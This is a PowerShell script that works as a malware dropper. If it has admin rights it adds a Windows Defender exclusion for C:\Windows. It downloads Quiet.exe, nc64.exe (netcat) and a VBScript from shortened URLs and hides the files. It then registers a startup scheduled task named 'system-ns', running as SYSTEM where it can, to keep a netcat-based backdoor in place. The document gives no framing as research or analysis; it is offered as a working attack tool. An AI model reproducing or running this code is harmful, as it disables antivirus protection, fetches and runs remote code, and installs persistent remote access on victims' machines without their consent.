# Check if the script is running as an Administrator
$isAdmin = ([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if ($isAdmin) {
    Write-Output "Running as Administrator"
    $installPath = "C:\Windows"
    $scriptVbsUrl = "https://rb.gy/w3a7hb"
    # Windows Defender Exclusion
    Add-MpPreference -ExclusionPath $installPath
} else {
    Write-Output "Not running as Administrator"
    $installPath = Join-Path $env:USERPROFILE "System"
    $scriptVbsUrl = "https://rb.gy/3lld2p"
}

# Create the installation directory if it doesn’t exist
if (-not (Test-Path $installPath)) {
    New-Item -ItemType Directory -Path $installPath -Force | Out-Null
}

# File download paths
$quietTxtPath = Join-Path $installPath "Quiet.exe"
$nc64TxtPath = Join-Path $installPath "nc64.exe"
$scriptVbsPath = Join-Path $installPath "script.vbs"

# URLs for Quiet.exe and nc64.exe
$quietTxtUrl = "https://rb.gy/mx0i5"
$nc64TxtUrl = "https://rb.gy/guty9"

# Download files
Invoke-WebRequest -Uri $quietTxtUrl -OutFile $quietTxtPath
Invoke-WebRequest -Uri $nc64TxtUrl -OutFile $nc64TxtPath
Invoke-WebRequest -Uri $scriptVbsUrl -OutFile $scriptVbsPath

# Make the downloaded files hidden
attrib +H $quietTxtPath
attrib +H $nc64TxtPath
attrib +H $scriptVbsPath

# Define task parameters
$taskName = "system-ns"
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -DontStopOnIdleEnd

try {
    if ($isAdmin) {
        # Admin: Use Register-ScheduledTask as SYSTEM
        $action = New-ScheduledTaskAction -Execute $scriptVbsPath
        $trigger = New-ScheduledTaskTrigger -AtStartup
        $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount
        Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Principal $principal -Settings $settings -Force
        Start-ScheduledTask -TaskName $taskName
    } else {
        # Non-Admin: Use schtasks /create
        $tr = "wscript.exe \`"$scriptVbsPath\`""
        cmd /c "schtasks /create /tn $taskName /tr $tr /sc ONSTART /ru $env:USERNAME /it /f"
        if ($LASTEXITCODE -eq 0) {
            Set-ScheduledTask -TaskName $taskName -Settings $settings
            Start-ScheduledTask -TaskName $taskName
        } else {
            Write-Output "Failed to create the scheduled task with schtasks, exit code: $LASTEXITCODE"
        }
    }
} catch {
    Write-Output "Failed to register, set, or start the scheduled task: $_"
}
